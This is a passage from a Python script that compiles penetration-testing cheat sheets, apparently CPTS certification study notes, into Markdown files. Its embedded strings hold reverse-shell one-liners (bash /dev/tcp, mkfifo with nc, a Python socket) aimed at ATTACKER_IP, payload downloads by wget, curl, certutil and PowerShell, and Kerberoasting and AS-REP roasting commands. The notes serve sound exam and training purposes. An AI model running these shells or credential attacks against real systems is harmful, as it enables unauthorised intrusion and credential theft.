**CPTS COVERAGE GAP:** no dedicated insecure-deserialization exploitation section exists in this dump.

============================================================
# [GRAPHQL]
============================================================

**CPTS COVERAGE GAP:** GraphQL appears only as an application/API clue, not as a complete operational exploitation subject.

============================================================
# [SSRF]
============================================================

The dump covers SSRF as a consequence/variant of RFI, XXE, uploads, and an enterprise-network local-file-read chain, but not the separate Server-Side Attacks module. Use the included XXE/RFI sections and search `SSRF` in this file; do not assume cloud-metadata syntax or bypasses not present in CPTS.
"""

PORTS_QUICK = r"""
============================================================
# [PORT QUICK ROUTER]
============================================================

```bash
nmap -Pn -sC -sV -pPORT TARGET
sudo nmap -Pn -sU -sV -pPORT TARGET   # UDP; slower and may need root
```

| Port | Service | First thought |
|---:|---|---|
| 21 | FTP | Anonymous login, files, writable directories, TLS/banner |
| 22 | SSH | Version, allowed auth, recovered credentials/keys |
| 25/465/587 | SMTP | Banner, users, relay policy, STARTTLS |
| 53 TCP/UDP | DNS | Records, nameservers, zone transfer, subdomains |
| 80/443/8080/8443 | HTTP(S) | Open `WEB.md` |
| 88 | Kerberos | Domain/user enumeration, AS-REP/Kerberoasting; open `AD.md` |
| 111/2049 | RPC/NFS | Exports, mount permissions, `no_root_squash` |
| 135/139/445 | MSRPC/SMB | Shares, null/guest, users, signing, credentials |
| 161 UDP | SNMP | Community strings, system/process/network data |
| 389/636 | LDAP(S) | Naming context, anonymous/credentialed queries, AD |
| 1433 | MSSQL | Credentials, impersonation, linked servers, `xp_cmdshell` conditions |
| 3306 | MySQL | Credentials, databases, files, web configuration reuse |
| 3389 | RDP | Credentials, NLA/TLS, desktop access |
| 5432 | PostgreSQL | Credentials, databases, roles, file/command possibilities by privilege |
| 5985/5986 | WinRM | Credential validation and PowerShell remoting |
| 6379 | Redis | Authentication, keys/configuration, application data |
| 27017 | MongoDB | Authentication and exposed databases |

### Manual client syntax

```bash
ftp TARGET
ssh -p 22 USER@TARGET
nc -nv TARGET 25
openssl s_client -connect TARGET:25 -starttls smtp
dig @TARGET DOMAIN ANY
dig axfr @TARGET DOMAIN
showmount -e TARGET
smbclient -L //TARGET -N
smbclient //TARGET/SHARE -U 'DOMAIN/USER%PASSWORD'
rpcclient -U 'DOMAIN/USER%PASSWORD' TARGET
snmpwalk -v2c -c COMMUNITY TARGET
ldapsearch -x -H ldap://TARGET -s base namingcontexts
ldapsearch -x -H ldap://TARGET -D 'USER_DN' -w 'PASSWORD' -b 'BASE_DN'
mysql -h TARGET -P 3306 -u USER -p
psql -h TARGET -p 5432 -U USER -d DATABASE
redis-cli -h TARGET -p 6379
mongosh 'mongodb://USER:PASSWORD@TARGET:27017/DATABASE'
```

```bash
impacket-mssqlclient 'DOMAIN/USER:PASSWORD@TARGET' -windows-auth
xfreerdp /v:TARGET /u:USER /p:'PASSWORD' /cert:ignore
evil-winrm -i TARGET -u USER -p 'PASSWORD'
```

If a client is not installed, use Nmap scripts, `nc`, `openssl s_client`, or the protocol-specific native alternatives retained below. UDP `open|filtered` is inconclusive: try a protocol-aware request and confirm responses rather than assuming the port is open.
"""

SHELLS_QUICK = r"""
============================================================
# [LISTENERS]
============================================================

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
socat -d -d TCP-LISTEN:4444,reuseaddr,fork STDOUT
```

============================================================
# [FAST LINUX PAYLOADS]
============================================================

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

============================================================
# [FAST STABILIZATION]
============================================================

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z on attacker
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 columns 120
```

If the shell dies immediately, check listener IP/port, routing/VPN interface, egress filtering, quoting/URL encoding, available interpreter, and whether the target is Windows rather than Linux.
"""

TRANSFER_QUICK = r"""
============================================================
# [FILE TRANSFER QUICK ROUTER]
============================================================

Attacker serves current directory:

```bash
python3 -m http.server 8000
```

Linux target downloads:

```bash
wget http://ATTACKER_IP:8000/FILE -O /tmp/FILE
curl http://ATTACKER_IP:8000/FILE -o /tmp/FILE
```

Windows target downloads:

```powershell
Invoke-WebRequest http://ATTACKER_IP:8000/FILE -OutFile C:\Windows\Temp\FILE
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/FILE','C:\Windows\Temp\FILE')
```

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP:8000/FILE C:\Windows\Temp\FILE
```

SSH copy:

```bash
scp FILE USER@TARGET:/tmp/FILE
scp USER@TARGET:/path/to/FILE ./FILE
```

Verify integrity when possible:

```bash
sha256sum FILE
```

```powershell
Get-FileHash FILE -Algorithm SHA256
```

If transfer fails: verify reachability, binding address, firewall/egress, proxy, URL path/case, write permission, disk space, AV quarantine, and binary architecture.
"""

AD_QUICK = r"""
============================================================
# [AD QUICK START]
============================================================

Attacker-side initial checks:

```bash
nmap -Pn -sC -sV -p53,88,135,139,389,445,464,636,3268,3269,5985,5986 DC_IP
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN DC_IP
smbclient -L //DC_IP -N
rpcclient -U '' -N DC_IP
ldapsearch -x -H ldap://DC_IP -s base namingcontexts
```

With credentials:

```bash
crackmapexec smb DC_IP -u USER -p 'PASSWORD' --shares
evil-winrm -i TARGET -u USER -p 'PASSWORD'
GetUserSPNs.py DOMAIN/USER:'PASSWORD' -dc-ip DC_IP -request
GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass -usersfile USERS.txt
```

```text
Valid domain credential
  → validate SMB/LDAP/Kerberos/WinRM
  → enumerate users/groups/computers/shares/password policy
  → collect BloodHound
  → Kerberoast/AS-REP/password spray within policy
  → re-run graph/enumeration after every new identity
  → inspect ACL paths, privileged access, trusts, tickets, and credential reuse
```

Do not spray until the password policy and lockout behavior are known. DNS resolution and clock synchronization are prerequisites for many Kerberos operations.
"""

AD_ROUTING = r"""
## AD decision routing

============================================================
# [AD CS / CERTIFICATE SERVICES]
============================================================

Search the included `/BLEEDING EDGE VULNERABILITIES` and `/PASS THE CERTIFICATE` sections. Confirm that AD CS/certificate enrollment endpoints exist, identify reachable CA/template context, and establish the exact enrollment/authentication condition before requesting or relaying anything. Certificate issuance and account-authentication changes can leave artifacts.

============================================================
# [DELEGATION]
============================================================

The dump discusses delegation and resource-based/constrained/unconstrained concepts within AD enumeration and trust/misconfiguration material rather than a single dedicated exploitation section. Search this file for `delegation`, `TrustedForDelegation`, `msDS-AllowedToDelegateTo`, and resource-based constrained delegation. Required conditions differ; do not treat every delegated object as exploitable.

============================================================
# [GPO / GROUP POLICY]
============================================================

Search `GPO`, `Group Policy`, `gplink`, and `gpresult` in the source-backed enumeration sections. Establish which principals can modify the GPO or its backing files, where it is linked, which computers/users receive it, and when policy refresh occurs before making any change.

============================================================
# [LAPS]
============================================================

Search `LAPS` in the included credentialed-enumeration and misconfiguration material. The important question is not merely whether LAPS is deployed, but whether the current principal can read the managed local-admin password attribute for any computer. Attribute names vary between legacy and newer Windows LAPS deployments; use the schema and tooling available in the target domain.

============================================================
# [AD FINAL CHECKLIST]
============================================================

- Domain/DNS/DC names and time resolution work correctly.
- SMB, LDAP, Kerberos and WinRM access validated with the least intrusive method.
- Users, groups, computers, shares, sessions, local admin paths and password policy enumerated.
- BloodHound/native collection performed and repeated after every new identity.
- Kerberoasting, AS-REP roasting and spraying considered only with their prerequisites/policy.
- Hashes/tickets/certificates tested with the correct protocol, domain format and cache/environment.
- ACL rights, privileged access, delegation, GPO, LAPS, AD CS and trusts searched explicitly.
- New access triggers credential hunting, local privilege escalation, lateral movement checks, and evidence preservation.
"""

def build() -> dict:
    OUT.mkdir(exist_ok=True)
    common_exclude = r"^(Introduction|Intro)|Skills Assessment|Beyond this Module|Prevention$|Hardening$"

    linux = items_for([
        ("linux-privilege-escalation", None, r"Introduction|Hardening|Skills Assessment"),
        ("password-attacks", r"Credential Hunting in Linux|Linux Authentication Process", None),
    ])
    windows = items_for([
        ("windows-privilege-escalation", None, r"Introduction|Hardening|Skills Assessment"),
        ("password-attacks", r"Attacking SAM|Attacking LSASS|Windows Credential Manager|Credential Hunting in Windows", None),
    ])
    web = items_for([
        ("information-gathering---web-edition", None, r"Introduction|Skills Assessment"),
        ("using-web-proxies", r"Intercepting|Repeating|Encoding|Proxying Tools|Intruder|Fuzzer", None),
        ("attacking-web-applications-with-ffuf", None, r"Introduction|Skills Assessment"),
        ("login-brute-forcing", None, r"Introduction|Password Security Fundamentals|Skills Assessment"),
        ("web-attacks", None, r"Introduction|Prevention|Skills Assessment"),
        ("file-inclusion", None, r"Intro|Prevention|Skills Assessment"),
        ("file-upload-attacks", None, r"Intro|Preventing|Skills Assessment"),
        ("sql-injection-fundamentals", r"SQL Injection|Subverting|Comments|Union|Database Enumeration|Reading Files|Writing Files", r"Prevention|Skills"),
        ("sqlmap-essentials", None, r"Overview|Skills Assessment"),
        ("command-injections", None, r"Intro|Prevention|Skills Assessment"),
        ("cross-site-scripting-xss", None, r"Intro|Prevention|Skills Assessment"),
        ("attacking-common-applications", None, r"Introduction|Hardening|Skills Assessment"),
        ("shells--payloads", r"Spawning Interactive Shells|PHP Web Shells|Web Shells", None),
    ])
    ports = items_for([
        ("footprinting", r"FTP|SMB|NFS|DNS|SMTP|IMAP|POP3|SNMP|MySQL|MSSQL|Oracle|IPMI|Remote Management", r"Lab"),
        ("attacking-common-services", None, r"Introduction|Concept|Latest|Skills|Easy|Medium|Hard"),
    ])
    shells = items_for([
        ("shells--payloads", None, r"Shells - Jack|Engagement|Detection"),
        ("getting-started", r"Types of Shells", None),
    ])
    transfers = items_for([
        ("file-transfers", None, r"^File Transfers$|Detection|Evading"),
        ("getting-started", r"Transferring Files", None),
    ])
    ad = items_for([
        ("active-directory-enumeration--attacks", None, r"Introduction|Tools Of The Trade|Scenario|Primer|Hardening|Auditing|Skills Assessment|Beyond"),
        ("password-attacks", r"Pass the Hash|Pass the Ticket|Pass the Certificate|Active Directory and NTDS", None),
        ("windows-privilege-escalation", r"DPAPI|DnsAdmins|Server Operators|Print Operators|Event Log Readers", None),
    ])

    docs = {
        "LINUX_PRIVESC.md": render("Linux Privilege Escalation", "Start here after obtaining a Linux shell. Follow the order from situational awareness and credentials through configuration weaknesses, privileged execution, containers, and kernel checks.", LINUX_QUICK, LINUX_ROUTING, linux),
        "WINDOWS_PRIVESC.md": render("Windows Privilege Escalation", "Start here after obtaining a Windows shell. Enumerate identity, privileges, credentials, services, tasks, permissions, groups, software, and version-specific paths in that order.", WINDOWS_QUICK, WINDOWS_ROUTING, windows),
        "WEB.md": render("Web Discovery to Foothold", "Start here when HTTP or HTTPS is found. Proceed from hostname and technology discovery through content/input enumeration, authentication, authorization, vulnerability classes, application-specific checks, and shell acquisition.", WEB_QUICK, WEB_ROUTING, web, WEB_GAPS),
        "PORTS.md": render("Port and Service Enumeration", "Compact service router backed by the CPTS Footprinting and Attacking Common Services modules.", PORTS_QUICK, "", ports),
        "SHELLS.md": render("Shells and Payloads", "Listeners, bind/reverse shells, payload generation, web shells, interactive-shell upgrades, and troubleshooting.", SHELLS_QUICK, "", shells),
        "FILE_TRANSFER.md": render("File Transfer", "Native and common-tool transfer methods for Linux and Windows, protected transfers, and integrity verification.", TRANSFER_QUICK, "", transfers),
        "AD.md": render("Active Directory Operational Workflow", "Domain discovery, credential validation, enumeration, roasting, ACLs, tickets, privileged access, trusts, and post-compromise workflows.", AD_QUICK, AD_ROUTING, ad),
    }
    for name, content in docs.items():
        (OUT / name).write_text(content, encoding="utf-8")

    manifest = {
        "files": {name: {"bytes": len(content.encode()), "source_sections": len({str(i.path) for i in vals})}
                  for (name, content), vals in zip(docs.items(), [linux, windows, web, ports, shells, transfers, ad])},
        "total_unique_source_sections": len({str(i.path) for vals in [linux, windows, web, ports, shells, transfers, ad] for i in vals}),
        "source_dump_modified": False,
    }
    return manifest

if __name__ == "__main__":
    result = build()
    print(json.dumps(result, indent=2))
